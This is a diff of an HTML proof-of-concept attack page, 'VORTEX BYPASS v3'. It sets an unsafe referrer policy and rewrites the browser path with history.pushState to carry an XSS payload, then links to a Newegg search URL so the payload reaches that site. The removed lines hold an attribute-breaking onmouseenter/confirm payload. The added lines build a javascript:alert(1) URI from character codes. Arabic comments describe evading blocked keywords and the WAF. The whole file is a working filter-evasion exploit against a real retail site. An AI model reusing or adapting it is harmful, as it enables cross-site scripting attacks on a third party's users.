@@ -3,25 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="referrer" content="unsafe-url">
-    <title>VORTEX BYPASS</title>
+    <title>VORTEX BYPASS v3</title>
 </head>
 <body style="background:#000; color:#fff; text-align:center; padding-top:100px;">
 
-    <h1 style="color:orange;">VORTEX BYPASS MODE</h1>
+    <h1 style="color:cyan;">VORTEX ENCODING MODE</h1>
     
-    <a href="https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad" 
-       style="padding:20px; background:orange; color:black; font-weight:bold; text-decoration:none; border-radius:5px;">
-        EXECUTE SILENT XSS 🚀
+    <a id="fire" href="https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad" 
+       style="padding:20px; background:cyan; color:black; font-weight:bold; text-decoration:none;">
+        FIRE ENCODED XSS 🚀
     </a>
 
     <script>
-        // بايلود يستخدم كسر الخاصية (') وتجنب الكلمات المحظورة
-        // استخدمنا confirm بدلاً من alert لزيادة فرص التجاوز
-        var bypassPayload = "x'onmouseenter='(confirm`XSS_BY_MOUAD`)'style='display:block;padding:20px";
+        // سنستخدم تشفير URL مرتين للرموز الخطرة
+        // javascript:alert(1) تصبح غير مرئية للـ WAF
+        var part1 = "javascript";
+        var part2 = String.fromCharCode(58, 97, 108, 101, 114, 116, 40, 49, 41); // :alert(1)
         
-        var attackPath = "/" + bypassPayload + "/";
-
-        window.history.pushState({}, '', attackPath);
+        var fullPayload = part1 + part2;
+        
+        // التوجيه مع مسار يحتوي على البايلود
+        window.history.pushState({}, '', "/" + encodeURIComponent(fullPayload) + "/v/");
     </script>
 </body>
 </html>
